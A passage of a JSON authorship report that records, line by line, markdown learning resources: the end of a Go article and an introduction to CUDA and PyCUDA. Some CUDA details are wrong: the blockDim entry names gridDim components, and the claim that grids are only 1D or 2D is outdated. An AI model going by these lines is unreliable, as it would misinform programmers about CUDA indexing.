        "lineNumber": 278,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 279,
        "author": {
          "gitId": "-"
        },
        "content": "## How to Get Started with Go?"
      },
      {
        "lineNumber": 280,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 281,
        "author": {
          "gitId": "-"
        },
        "content": "Go provides its own [installation guide](https://golang.org/doc/install) and an interactive [ tour of Go](https://tour.golang.org/). These are useful and highly comprehensive resources for programmers looking to learn the syntax and style of Go. For those who prefer to read existing code examples, [Go by Example](https://gobyexample.com/) is a collection of code samples covering a wide variety of features in Go, and includes line-by-line explanations of the code. For those looking for a quick crash course on Go syntax, the Learn X In Y Minutes [Go cheatsheet](https://learnxinyminutes.com/docs/go/) may also be a good starting point."
      },
      {
        "lineNumber": 282,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 283,
        "author": {
          "gitId": "-"
        },
        "content": "### Where to Go from Here?"
      },
      {
        "lineNumber": 284,
        "author": {
          "gitId": "-"
        },
        "content": "Go\u0027s development team is heavily involved in documenting and growing the Go language and community. If you are keen to learn more about Go, here are some resources to help you get started:"
      },
      {
        "lineNumber": 285,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 286,
        "author": {
          "gitId": "-"
        },
        "content": "- [The Go FAQ](https://golang.org/doc/faq) - answers common questions about the language\u0027s history, usage, design and more"
      },
      {
        "lineNumber": 287,
        "author": {
          "gitId": "-"
        },
        "content": "- [Go\u0027s documentation](https://golang.org/doc/) - a good starting point, contains links to official information about Go"
      },
      {
        "lineNumber": 288,
        "author": {
          "gitId": "-"
        },
        "content": "- [The Go Blog](https://blog.golang.org/) - features news and in-depth articles about Go by the Go team and guests"
      },
      {
        "lineNumber": 289,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 290,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/div\u003e"
      }
    ],
    "authorContributionMap": {
      "jamessspanggg": 2,
      "iskandarzulkarnaien": 14,
      "-": 274
    }
  },
  {
    "path": "contents/gpgpu/cuda.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "-"
        },
        "content": "  title: An Introduction to CUDA"
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "-"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "-"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "-"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "-"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "-"
        },
        "content": "  pageNav: 3"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "-"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "-"
        },
        "content": "# An Introduction to CUDA"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "-"
        },
        "content": "###### Author: [Pierce Anderson Fu](https://github.com/PierceAndy)"
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003cbox id\u003d\"article-toc\"\u003e"
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": ""
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [§ 0. Disclaimer‎](#0-disclaimer)"
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [§ 1. CUDA‎](#1-cuda)"
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "    * [§ 1.1 What is CUDA?‎](#1-1-what-is-cuda)"
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "    * [§ 1.2 CUDA Terminologies‎](#1-2-cuda-terminologies)"
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "    * [§ 1.3 Kernel Implementations in C‎](#1-3-kernel-implementations-in-c)"
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "    * [§ 1.4 Introductory Tutorial‎](#1-4-introductory-tutorial)"
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [§ 2. PyCUDA‎](#2-pycuda)"
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "    * [§ 2.1 What is PyCUDA?‎](#2-1-what-is-pycuda)"
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "    * [§ 2.2 Does this mean not having to use C, and coding entirely in Python?‎](#2-2-does-this-mean-not-having-to-use-c-and-coding-entirely-in-python)"
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "    * [§ 2.3 So Why bother with PyCUDA?‎](#2-3-so-why-bother-with-pycuda)"
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "    * [§ 2.4 Installing PyCUDA‎](#2-4-installing-pycuda)"
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "    * [§ 2.5 Minor PyCUDA Terminologies‎](#2-5-minor-pycuda-terminologies)"
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "    * [§ 2.6 Introductory Tutorial‎](#2-6-introductory-tutorial)"
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [§ 3. CUDA vs OpenCL‎](#3-cuda-vs-opencl)"
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "    * [§ 3.1 What is OpenCL?‎](#3-1-what-is-opencl)"
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "    * [§ 3.2 Differences between CUDA and OpenCL‎](#3-2-differences-between-cuda-and-opencl)"
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [§ 4. Further Readings‎](#4-further-readings)"
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [§ 5. References‎](#5-references)"
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "-"
        },
        "content": "## § 0. Disclaimer"
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "-"
        },
        "content": "This learning resource assumes that you understand what GPGPU is."
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "-"
        },
        "content": "If not, find out more about GPGPU at [se-edu\u0027s learning resource on GPGPU](gpgpu.html)."
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "-"
        },
        "content": "## § 1. CUDA"
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "-"
        },
        "content": "### § 1.1 What is CUDA?"
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "-"
        },
        "content": "CUDA is a parallel computing platform and programming model from NVIDIA.\u003csup\u003e[[1]](#footnote1)\u003c/sup\u003e"
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "-"
        },
        "content": "It allows us to use a CUDA-enabled GPU for GPGPU. The list of GPUs that support CUDA can be found here: https://developer.nvidia.com/cuda-gpus."
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "-"
        },
        "content": "### § 1.2 CUDA Terminologies"
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "-"
        },
        "content": "#### Host"
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "-"
        },
        "content": "Refers to CPU and its memory"
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "-"
        },
        "content": "#### Host code"
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "-"
        },
        "content": "Code that runs on CPU"
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "-"
        },
        "content": "#### Device"
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "-"
        },
        "content": "Refers to GPU and its memory"
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "-"
        },
        "content": "#### Device code"
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "-"
        },
        "content": "Code that runs on GPU"
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "-"
        },
        "content": "#### Streaming Multiprocessors (SMs)"
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "-"
        },
        "content": "CUDA GPUs have many parallel processors grouped into SMs"
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "-"
        },
        "content": "Each SM can run multiple concurrent thread blocks that execute independently from each other."
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "-"
        },
        "content": "#### Kernels"
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "-"
        },
        "content": "CUDA C extends C by allowing the programmer to define C functions, called kernels, that are run by the GPU."
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 76,
        "author": {
          "gitId": "-"
        },
        "content": "When called, kernels are executed `N` times in parallel by `N` different CUDA threads, as opposed to only once like regular C functions.\u003csup\u003e[[2]](#footnote2)\u003c/sup\u003e"
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "-"
        },
        "content": "CUDA executes kernels using a grid of blocks of threads."
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "-"
        },
        "content": "#### Threads"
      },
      {
        "lineNumber": 81,
        "author": {
          "gitId": "-"
        },
        "content": "An execution of a kernel with a given index."
      },
      {
        "lineNumber": 82,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 83,
        "author": {
          "gitId": "-"
        },
        "content": "Each thread uses its index to access elements in array such that the collection of all threads cooperatively processes the entire data set.\u003csup\u003e[[3]](#footnote3)\u003c/sup\u003e"
      },
      {
        "lineNumber": 84,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 85,
        "author": {
          "gitId": "-"
        },
        "content": "#### Blocks"
      },
      {
        "lineNumber": 86,
        "author": {
          "gitId": "-"
        },
        "content": "A logical group of threads."
      },
      {
        "lineNumber": 87,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 88,
        "author": {
          "gitId": "-"
        },
        "content": "The threads in a block can be arranged into 1D, 2D, or 3D arrays, and can be identified using 1D (`x`), 2D (`x`, `y`), or 3D (`x`, `y`, `z`) indexes, respectively."
      },
      {
        "lineNumber": 89,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 90,
        "author": {
          "gitId": "-"
        },
        "content": "Each block is atomically assigned to and run by a single SM. A single block will never be split up, and it will never be processed by more than one SM. However, note that it isn\u0027t a one-to-one relationship, and one SM can concurrently process more than one block. There is no synchronization between blocks, and they are executed independently from each other.\u003csup\u003e[[3]](#footnote3)\u003c/sup\u003e"
      },
      {
        "lineNumber": 91,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 92,
        "author": {
          "gitId": "-"
        },
        "content": "#### Grids"
      },
      {
        "lineNumber": 93,
        "author": {
          "gitId": "-"
        },
        "content": "A logical group of blocks."
      },
      {
        "lineNumber": 94,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 95,
        "author": {
          "gitId": "-"
        },
        "content": "The blocks in a grid can be arranged into 1D, or 2D arrays, and can be identified using 1D (`x`), or 2D (`x`, `y`) indexes, respectively."
      },
      {
        "lineNumber": 96,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 97,
        "author": {
          "gitId": "-"
        },
        "content": "##### NVIDIA\u0027s official word on Kernels, Threads, Blocks, and Grids"
      },
      {
        "lineNumber": 98,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e When a CUDA program on the host CPU invokes a kernel grid, the blocks of the grid are enumerated and distributed to multiprocessors with available execution capacity. The threads of a thread block execute concurrently on one multiprocessor, and multiple thread blocks can execute concurrently on one multiprocessor. As thread blocks terminate, new blocks are launched on the vacated multiprocessors.\u003csup\u003e[[4]](#footnote4)\u003c/sup\u003e"
      },
      {
        "lineNumber": 99,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 100,
        "author": {
          "gitId": "-"
        },
        "content": "![alt text](gpgpu_architecture.png \"GPGPU architecture\")"
      },
      {
        "lineNumber": 101,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 102,
        "author": {
          "gitId": "-"
        },
        "content": "### § 1.3 Kernel Implementations in C"
      },
      {
        "lineNumber": 103,
        "author": {
          "gitId": "-"
        },
        "content": "A kernel is defined using the `__global__` declaration specifier. This tells the CUDA C++ compiler that this is a function that runs on the GPU and can be called from CPU code."
      },
      {
        "lineNumber": 104,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 105,
        "author": {
          "gitId": "-"
        },
        "content": "The number of CUDA threads that execute that kernel for a given kernel call is specified using the `\u003c\u003c\u003c...\u003e\u003e\u003e` execution configuration.\u003csup\u003e[[2]](#footnote2)\u003c/sup\u003e A kernel called `myKernel` can be launched with the following syntax in C:"
      },
      {
        "lineNumber": 106,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 107,
        "author": {
          "gitId": "-"
        },
        "content": "`myKernel\u003c\u003c\u003cnumBlocks, numThreadsPerBlock\u003e\u003e\u003e(args)`"
      },
      {
        "lineNumber": 108,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 109,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e ##### Definitions:"
      },
      {
        "lineNumber": 110,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e"
      },
      {
        "lineNumber": 111,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e *`numBlocks`* refers to the number of thread blocks in the grid."
      },
      {
        "lineNumber": 112,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e"
      },
      {
        "lineNumber": 113,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e *`numThreadsPerBlock`* refers to the number of threads in each thread block."
      },
      {
        "lineNumber": 114,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 115,
        "author": {
          "gitId": "-"
        },
        "content": "Note that different GPUs work optimally with different dimension parameters.\u003csup\u003e[[5]](#footnote5)\u003c/sup\u003e"
      },
      {
        "lineNumber": 116,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 117,
        "author": {
          "gitId": "-"
        },
        "content": "Each thread that executes the kernel is given a unique thread ID that is accessible within the kernel through the built-in `threadIdx` variable."
      },
      {
        "lineNumber": 118,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 119,
        "author": {
          "gitId": "-"
        },
        "content": "As an illustration, the following sample code adds two vectors `A` and `B` of size `N` and stores the result into vector `results`:\u003csup\u003e[[2]](#footnote2)\u003c/sup\u003e"
      },
      {
        "lineNumber": 120,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 121,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 122,
        "author": {
          "gitId": "-"
        },
        "content": "// Kernel definition"
      },
      {
        "lineNumber": 123,
        "author": {
          "gitId": "-"
        },
        "content": "__global__ void VecAdd(float* A, float* B, float* results)"
      },
      {
        "lineNumber": 124,
        "author": {
          "gitId": "-"
        },
        "content": "{"
      },
      {
        "lineNumber": 125,
        "author": {
          "gitId": "-"
        },
        "content": "    int i \u003d threadIdx.x;"
      },
      {
        "lineNumber": 126,
        "author": {
          "gitId": "-"
        },
        "content": "    results[i] \u003d A[i] + B[i];"
      },
      {
        "lineNumber": 127,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 128,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 129,
        "author": {
          "gitId": "-"
        },
        "content": "int main()"
      },
      {
        "lineNumber": 130,
        "author": {
          "gitId": "-"
        },
        "content": "{"
      },
      {
        "lineNumber": 131,
        "author": {
          "gitId": "-"
        },
        "content": "    ..."
      },
      {
        "lineNumber": 132,
        "author": {
          "gitId": "-"
        },
        "content": "    // Kernel invocation of 1D block with N threads"
      },
      {
        "lineNumber": 133,
        "author": {
          "gitId": "-"
        },
        "content": "    VecAdd\u003c\u003c\u003c1, N\u003e\u003e\u003e(A, B, results);"
      },
      {
        "lineNumber": 134,
        "author": {
          "gitId": "-"
        },
        "content": "    ..."
      },
      {
        "lineNumber": 135,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 136,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 137,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 138,
        "author": {
          "gitId": "-"
        },
        "content": "#### § 1.3.1 Keywords that let kernels get indexes of running threads"
      },
      {
        "lineNumber": 139,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 140,
        "author": {
          "gitId": "-"
        },
        "content": "##### `gridDim`"
      },
      {
        "lineNumber": 141,
        "author": {
          "gitId": "-"
        },
        "content": "Dimensions of the grid in blocks."
      },
      {
        "lineNumber": 142,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 143,
        "author": {
          "gitId": "-"
        },
        "content": "First dimension of blocks is accessed with `gridDim.x`, and second dimension is accessed with `gridDim.y`. `gridDim.z` is unused as blocks can either be 1D or 2D only."
      },
      {
        "lineNumber": 144,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 145,
        "author": {
          "gitId": "-"
        },
        "content": "##### `blockDim`"
      },
      {
        "lineNumber": 146,
        "author": {
          "gitId": "-"
        },
        "content": "Dimensions of the block in threads."
      },
      {
        "lineNumber": 147,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 148,
        "author": {
          "gitId": "-"
        },
        "content": "First dimension of threads is accessed with `gridDim.x`, second dimension is accessed with `gridDim.y`, and third dimension is accessed with `gridDim.z`."
      },
      {
        "lineNumber": 149,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 150,
        "author": {
          "gitId": "-"
        },
        "content": "##### `blockIdx`"
      },
      {
        "lineNumber": 151,
        "author": {
          "gitId": "-"
        },
        "content": "Block index within the grid. Is grid-level unique."
      },
      {
        "lineNumber": 152,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 153,
        "author": {
          "gitId": "-"
        },
        "content": "##### `threadIdx`"
      },
      {
        "lineNumber": 154,
        "author": {
          "gitId": "-"
        },
        "content": "Thread index within the block. Is block-level unique."
      },
      {
        "lineNumber": 155,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 156,
        "author": {
          "gitId": "-"
        },
        "content": "For instance, the index of a thread in a 1D grid of a 1D block of threads can be determined using"
      },
      {
        "lineNumber": 157,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 158,
        "author": {
          "gitId": "-"
        },
        "content": "`blockIdx.x * blockDim.x + threadIdx.x`"
      },
      {
        "lineNumber": 159,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 160,
        "author": {
          "gitId": "-"
        },
        "content": "### § 1.4 Introductory Tutorial"
      },
      {
        "lineNumber": 161,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 162,
        "author": {
          "gitId": "-"
        },
        "content": "Refer to the excellent tutorial by the Chief Technologist for GPU Computing Software at NVIDIA here: [An Even Easier Introduction to CUDA](https://devblogs.nvidia.com/parallelforall/even-easier-introduction-cuda/)."
      },
      {
        "lineNumber": 163,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 164,
        "author": {
          "gitId": "-"
        },
        "content": "Should you have trouble understanding any terms, you can refer to [section 1.2 of this guide on CUDA terminologies](#-12-cuda-terminologies)."
      },
      {
        "lineNumber": 165,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 166,
        "author": {
          "gitId": "-"
        },
        "content": "## § 2. PyCUDA"
      },
      {
        "lineNumber": 167,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 168,
        "author": {
          "gitId": "-"
        },
        "content": "### § 2.1 What is PyCUDA?"
      },
      {
        "lineNumber": 169,
        "author": {
          "gitId": "-"
        },
        "content": "PyCUDA lets you access NVIDIA‘s CUDA parallel computation API from Python.\u003csup\u003e[[6]](#footnote6)\u003c/sup\u003e"
      },
      {
        "lineNumber": 170,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 171,
        "author": {
          "gitId": "-"
        },
        "content": "### § 2.2 Does this mean not having to use C, and coding entirely in Python?"
      },
      {
        "lineNumber": 172,
        "author": {
          "gitId": "-"
        },
        "content": "Not entirely so."
      },
      {
        "lineNumber": 173,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 174,
        "author": {
          "gitId": "-"
        },
        "content": "While kernels will have to be written in CUDA C, PyCUDA has helper interfaces that make it easier to write CUDA code (e.g. with memory management and cleanup). However, with the right helpers, you can write CUDA code without needing to write any C code at all. For instance, [see this example from the Wiki that performs a 2D fast Fourier transform (FFT) without any CUDA C code](https://wiki.tiker.net/PyCuda/Examples/2DFFT).\u003csup\u003e[[7]](#footnote7)\u003c/sup\u003e"
      },
      {
        "lineNumber": 175,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 176,
        "author": {
          "gitId": "-"
        },
        "content": "### § 2.3 So Why bother with PyCUDA?"
      },
      {
        "lineNumber": 177,
        "author": {
          "gitId": "-"
        },
        "content": "- Object cleanup tied to lifetime of objects. This idiom, often called [RAII](https://en.wikipedia.org/wiki/Resource_Acquisition_Is_Initialization) in C++, makes it much easier to write correct, leak- and crash-free code. PyCUDA knows about dependencies, too, so (for example) it won’t detach from a context before all memory allocated in it is also freed.\u003csup\u003e[[6]](#footnote6)\u003c/sup\u003e"
      },
      {
        "lineNumber": 178,
        "author": {
          "gitId": "-"
        },
        "content": "- Convenience. Abstractions like pycuda.driver.SourceModule and pycuda.gpuarray.GPUArray make CUDA programming even more convenient than with NVIDIA’s C-based runtime.\u003csup\u003e[[6]](#footnote6)\u003c/sup\u003e"
      },
      {
        "lineNumber": 179,
        "author": {
          "gitId": "-"
        },
        "content": "- Completeness. PyCUDA puts the full power of CUDA’s driver API at your disposal, if you wish.\u003csup\u003e[[6]](#footnote6)\u003c/sup\u003e"
      },
      {
        "lineNumber": 180,
        "author": {
          "gitId": "-"
        },
        "content": "- Automatic Error Checking. All CUDA errors are automatically translated into Python exceptions.\u003csup\u003e[[6]](#footnote6)\u003c/sup\u003e"
      },
      {
        "lineNumber": 181,
        "author": {
          "gitId": "-"
        },
        "content": "- Speed. PyCUDA’s base layer is written in C++, so all the niceties above are virtually free.\u003csup\u003e[[6]](#footnote6)\u003c/sup\u003e"
      },
      {
        "lineNumber": 182,
        "author": {
          "gitId": "-"
        },
        "content": "- Helpful [documentation](https://documen.tician.de/pycuda/) and [Wiki](https://wiki.tiker.net/PyCuda).\u003csup\u003e[[6]](#footnote6)\u003c/sup\u003e"
      },
      {
        "lineNumber": 183,
        "author": {
          "gitId": "-"
        },
        "content": "- [Open sourced on GitHub](https://github.com/inducer/pycuda)."
      },
      {
        "lineNumber": 184,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 185,
        "author": {
          "gitId": "-"
        },
        "content": "Thus, if you\u0027re not familiar with C, it would be easier to learn about CUDA through PyCUDA, especially if you have prior experience with Python."
      },
      {
        "lineNumber": 186,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 187,
        "author": {
          "gitId": "-"
        },
        "content": "### § 2.4 Installing PyCUDA"
      },
      {
        "lineNumber": 188,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 189,
        "author": {
          "gitId": "-"
        },
        "content": "Official installation instructions here: https://wiki.tiker.net/PyCuda/Installation"
      },
      {
        "lineNumber": 190,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 191,
        "author": {
          "gitId": "-"
        },
        "content": "### § 2.5 Minor PyCUDA Terminologies"
      },
      {
        "lineNumber": 192,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 193,
        "author": {
          "gitId": "-"
        },
        "content": "#### dtoh"
      },
      {
        "lineNumber": 194,
        "author": {
          "gitId": "-"
        },
        "content": "Device to host, *i.e.* GPU to CPU."
      },
      {
        "lineNumber": 195,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 196,
        "author": {
          "gitId": "-"
        },
        "content": "#### htod"
      },
      {
        "lineNumber": 197,
        "author": {
          "gitId": "-"
        },
        "content": "Host to device, *i.e.* CPU to GPU."
      },
      {
        "lineNumber": 198,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 199,
        "author": {
          "gitId": "-"
        },
        "content": "### § 2.6 Introductory Tutorial"
      },
      {
        "lineNumber": 200,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 201,
        "author": {
          "gitId": "-"
        },
        "content": "Official tutorial here: https://documen.tician.de/pycuda/tutorial.html"
      },
      {
        "lineNumber": 202,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 203,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e ##### Note:"
      },
      {
        "lineNumber": 204,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e"
      },
      {
        "lineNumber": 205,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e While still useful and relevant, this tutorial was originally written in 2008, and contains some outdated information."
      },
      {
        "lineNumber": 206,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e"
      },
      {
        "lineNumber": 207,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e Specifically, the point about how \"most nVidia [*sic*] devices only support single precision\" is incorrect. All NVIDIA GPUs since GT200 (released in Sep 2008), with compute capability 1.3 or higher, provide hardware support for double precision floating point values and operations.\u003csup\u003e[[8]](#footnote8)\u003c/sup\u003e"
      },
      {
        "lineNumber": 208,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e"
      },
      {
        "lineNumber": 209,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e You can find out the compute capability of your NVIDIA card from the [official website](https://developer.nvidia.com/cuda-gpus) or [this table from Wikipedia](https://en.wikipedia.org/wiki/CUDA#GPUs_supported)."
      },
      {
        "lineNumber": 210,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e"
      },
      {
        "lineNumber": 211,
        "author": {
          "gitId": "jamessspanggg"
        },
